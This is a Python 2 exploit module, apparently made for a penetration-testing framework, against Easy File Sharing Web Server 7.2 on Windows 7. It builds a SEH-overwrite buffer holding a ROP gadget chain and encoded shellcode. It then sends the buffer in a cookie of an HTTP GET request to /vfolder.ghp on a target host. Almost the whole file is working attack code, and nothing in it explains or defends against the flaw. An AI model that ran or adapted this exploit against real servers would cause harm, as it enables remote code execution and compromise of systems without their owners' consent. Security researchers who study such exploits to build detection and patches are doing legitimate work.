import socket, struct, time, sys

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (%s)\n" %name
	print "  ID       Device"
	print "  --       ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("WebFTPoverflow","Normal","Easy File Sharing Web Server 7.2 Overflow")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print "\nPublisher Information for %s" %name
	print
	print "       Name:",name
	print "     Module:",module
	print "   Platform:",plat
	print " Privileged:",priv
	print "    License:",lic
	print "       Rank:",rank
	print "  Disclosed:",release
	print "         By:",by

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

try: RHOST
except: pass
try: RPORT
except: RPORT = 80
try: TIMEOUT
except: TIMEOUT = 5

def show_opt():
	print "\nModule Options (WebFTPoverflow)\n"
	print "  Name     Current Setting  Required  Description"
	print "  ----     ---------------  --------  -----------"
	try:
		auto_opt("RHOST",RHOST,"yes", "Target Host")
	except:
		auto_opt("RHOST","   ","yes", "Target Host")
	try:
		auto_opt("RPORT",str(RPORT),"yes", "Target Port")
	except:
		auto_opt("RPORT","   ","yes", "Target Port")
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-info":
		auto_info(name,"payloads/WebFTPoverflow","Python 2.7","No","N/A","Normal","7/8/17","Sungchul Park")
		show_opt()
		targets = {"1":"Winows 7 SP1","2":"Easy File Sharing Website 7.2"}
		auto_targ(targets)
except:
	pass

def create_rop_chain():
	rop_gadgets = [
		0x10015442,0xFFFFEFFF,
		0x100231d1,0x1001614d,
		0x1001da09,0x1001a858,
		0x1001a858,0x10015442,
		0x1004de84,0x10022c4c,
		0x10022c1e,0xffffffff,
		
		0x10015442,0xffffffff,
		0xffffffff,0xffffffff,
		0xffffffff,0x1004d1fc,
		0x1002248c,0x61c0a798,
		0x1001aeb4,0xffffffff,
		0x1001715d,0x10021a3e,
		
		0x10013860,0x61c24169,
		
		0x100132ba,0xffffffff,
		0x61c2785d,0x1001f6da,
		
		0x10019dfa,0xffffffff,
		0x61c68081,0x61c68081,
		0x61c06831,0x61c06831,
		0x61c06831,0x61c06831,
		0x61c06831,0x61c06831,
		
		0x61c373a4,0x1001a858,
		
		0x10015442,0x90909090,
		0x100240c2,
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def overflow(host,port=80,TIMEOUT=5):
	socket.setdefaulttimeout(TIMEOUT)
	rop_chain = create_rop_chain()
	
	print "\n[*] Creating Shellcode"
	shellcode = "\x90"*200
	shellcode += "\xdb\xdd\xbb\x5e\x78\x34\xc0\xd9\x74\x24\xf4\x5e"
	shellcode += "\x29\xc9\xb1\x54\x31\x5e\x18\x03\x5e\x18\x83\xc6"
	shellcode += "\x5a\x9a\xc1\x3c\x8a\xd8\x2a\xbd\x4a\xbd\xa3\x58"
	shellcode += "\x7b\xfd\xd0\x29\x2b\xcd\x93\x7c\xc7\xa6\xf6\x94"
	shellcode += "\x5c\xca\xde\x9b\xd5\x61\x39\x95\xe6\xda\x79\xb4"
	shellcode += "\x64\x21\xae\x16\x55\xea\xa3\x57\x92\x17\x49\x05"
	shellcode += "\x4b\x53\xfc\xba\xf8\x29\x3d\x30\xb2\xbc\x45\xa5"
	shellcode += "\x02\xbe\x64\x78\x19\x99\xa6\x7a\xce\x91\xee\x64"
	shellcode += "\x13\x9f\xb9\x1f\xe7\x6b\x38\xf6\x36\x93\x97\x37"
	shellcode += "\xf7\x66\xe9\x70\x3f\x99\x9c\x88\x3c\x24\xa7\x4e"
	shellcode += "\x3f\xf2\x22\x55\xe7\x71\x94\xb1\x16\x55\x43\x31"
	shellcode += "\x14\x12\x07\x1d\x38\xa5\xc4\x15\x44\x2e\xeb\xf9"
	shellcode += "\xcd\x74\xc8\xdd\x96\x2f\x71\x47\x72\x81\x8e\x97"
	shellcode += "\xdd\x7e\x2b\xd3\xf3\x6b\x46\xbe\x9b\x58\x6b\x41"
	shellcode += "\x5b\xf7\xfc\x32\x69\x58\x57\xdd\xc1\x11\x71\x1a"
	shellcode += "\x26\x08\xc5\xb4\xd9\xb3\x36\x9c\x1d\xe7\x66\xb6"
	shellcode += "\xb4\x88\xec\x46\x39\x5d\x98\x43\xad\x9e\xf5\x60"
	shellcode += "\xad\x77\x04\x79\x8c\x0e\x81\x9f\x9e\x40\xc2\x0f"
	shellcode += "\x5e\x31\xa2\xff\x36\x5b\x2d\xdf\x26\x64\xe7\x48"
	shellcode += "\xcc\x8b\x5e\x20\x78\x35\xfb\xba\x19\xba\xd1\xc6"
	shellcode += "\x19\x30\xd0\x37\xd7\xb1\x91\x2b\x0f\xa0\x59\xb4"
	shellcode += "\xcf\x49\x5a\xde\xcb\xdb\x0d\x76\xd1\x3a\x79\xd9"
	shellcode += "\x2a\x69\xf9\x1e\xd4\xec\xc8\x55\xe2\x7a\x75\x02"
	shellcode += "\x0a\x6b\x75\xd2\x5c\xe1\x75\xba\x38\x51\x26\xdf"
	shellcode += "\x47\x4c\x5a\x4c\xdd\x6f\x0b\x20\x76\x18\xb1\x1f"
	shellcode += "\xb0\x87\x4a\x4a\xc3\xc0\xb5\x08\xe1\x68\xde\xf2"
	shellcode += "\xa5\x88\x1e\x99\x25\xd9\x76\x56\x0a\xd6\xb6\x97"
	shellcode += "\x81\xbf\xde\x12\x47\x0d\x7e\x22\x42\xd3\xde\x23"
	shellcode += "\x60\xc8\x37\xaa\x87\xef\x37\x4c\xb4\x39\x0e\x3a"
	shellcode += "\xfd\xf9\x35\x35\xb4\x5c\x1f\xdc\xb6\xf3\x5f\xf5"
	time.sleep(0.3)
	
	max_size = 4000
	seh_offset = 57
	eax_offset = 73
	rop_offset = 2788
	
	buffer = "A" * seh_offset
	buffer += "BBBB"
	buffer += struct.pack("<I", 0x1002280a)
	buffer += "A" * (eax_offset - len(buffer))
	buffer += "DDDD"
	buffer += "C" * rop_offset
	buffer += rop_chain
	buffer += shellcode
	buffer += "B" * (max_size - len(buffer))
	
	print "[*] Creating Request"
	request = "GET /vfolder.ghp HTTP/1.1\r\n"
	request += "Host: " + host + "\r\n"
	request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" + "\r\n"
	request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" + "\r\n"
	request += "Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4" + "\r\n"
	request += "Cookie: SESSIONID=3672; UserID=PassWD=" + buffer + "; frmUserName=; frmUserPass=;"
	request += "\r\n"
	request += "Connection: keep-alive" + "\r\n"
	request += "If-Modified-Since: Thu, 06 Jul 2017 14:12:13 GMT" + "\r\n"
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "[*] Connecting"
	s.connect((host, port))
	print "[*] Sending Payload"
	s.send(request + "\r\n\r\n")
	print "[*] Payload Sent\n[*] Response:\n"
	print s.recv(1024)
	print
	s.close()

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			if RHOST and RPORT and TIMEOUT:
				overflow(RHOST,int(RPORT),int(TIMEOUT))
		except Exception as e:
			print "\n[*] Overflow Failed"
			print e
			print
			time.sleep(0.3)
except:
	pass
